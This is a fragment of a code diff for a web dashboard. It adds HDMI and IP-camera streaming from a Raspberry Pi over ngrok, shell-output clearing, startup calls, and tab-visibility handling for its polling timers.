+  document.getElementById('shellOutput').innerHTML = '<span style="color:var(--fg2);">Run a command above — output appears here.</span>';
+  document.getElementById('shellPollStatus').textContent = '';
+}
+
+// ── IP Camera source toggle ───────────────────────────────────────────────────
+function onCamSourceChange() {
+  const isHdmi = document.getElementById('camSource').value === 'hdmi';
+  document.getElementById('urlConfig').hidden   = isHdmi;
+  document.getElementById('hdmiConfig').hidden  = !isHdmi;
+  if (isHdmi) loadHdmiInfo();
+}
+
+// ── HDMI capture ──────────────────────────────────────────────────────────────
+async function loadHdmiInfo() {
+  const el = document.getElementById('hdmiDeviceList');
+  el.textContent = 'Checking Pi…';
+  try {
+    const j = await (await fetch(RELAY_BASE + '/api/cam/hdmi/info')).json();
+    if (!j.ffmpeg) {
+      el.innerHTML = '⚠ ffmpeg not found. Run: <code>sudo apt install ffmpeg</code>';
+    } else if (!j.devices.length) {
+      el.innerHTML = '⚠ No video devices detected. Check capture card is plugged in.';
+    } else {
+      el.innerHTML = 'Devices: <strong>' + j.devices.join(', ') + '</strong>'
+                   + (j.ready ? ' · <span style="color:var(--green)">✓ Ready</span>' : '');
+      document.getElementById('hdmiDevice').value = j.devices[0];
+    }
+  } catch(e) {
+    el.textContent = 'Could not reach Pi.';
+  }
+}
+
+async function startHdmiStream() {
+  const device = document.getElementById('hdmiDevice').value.trim() || '/dev/video0';
+  const res    = document.getElementById('hdmiRes').value.split('x');
+  const fps    = parseInt(document.getElementById('hdmiFps').value);
+  try {
+    await fetch(RELAY_BASE + '/api/cam/hdmi/config', {
+      method: 'POST', headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({device, width: +res[0], height: +res[1], fps})
+    });
+  } catch(e) {}
+
+  const img = document.getElementById('camImg');
+  img.src   = RELAY_BASE + '/api/cam/hdmi?t=' + Date.now();
+  img.hidden = false;
+  document.getElementById('camEmpty').hidden = true;
+  document.getElementById('camStatus').textContent = '⏵ HDMI → Pi → ngrok';
+  document.getElementById('btnHdmiStart').hidden = true;
+  document.getElementById('btnHdmiStop').hidden  = false;
+
+  img.onerror = () => {
+    document.getElementById('camStatus').textContent = '✗ Stream error — check ffmpeg + device path on Pi.';
+    document.getElementById('camEmpty').hidden = false;
+    img.hidden = true;
+    stopHdmiStream();
+  };
+}
+
+function stopHdmiStream() {
+  const img = document.getElementById('camImg');
+  img.src = ''; img.hidden = true;
+  document.getElementById('camEmpty').hidden = false;
+  document.getElementById('camStatus').textContent = 'Stream stopped.';
+  document.getElementById('btnHdmiStart').hidden = false;
+  document.getElementById('btnHdmiStop').hidden  = true;
+}
+
+// ── boot ─────────────────────────────────────────────────────────────────────
+buildTopics(getSuffix());
+loadMacros();
+connect();
+updateOsHint();
+restoreCamUrl();
+// Pause all polling when tab is hidden (browser backgrounded), resume on return
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) {
+    clearInterval(_screenPollTimer); _screenPollTimer = null;
+    clearInterval(_devPollTimer);    _devPollTimer    = null;
+  } else {
+    if (_activeTab === 'screen') _screenPollTimer = setInterval(pollScreenshot, 3000);
+    if (_activeTab === 'shell')  startDevicePoll();
+  }
+});
+</script>
+</body>
+</html>
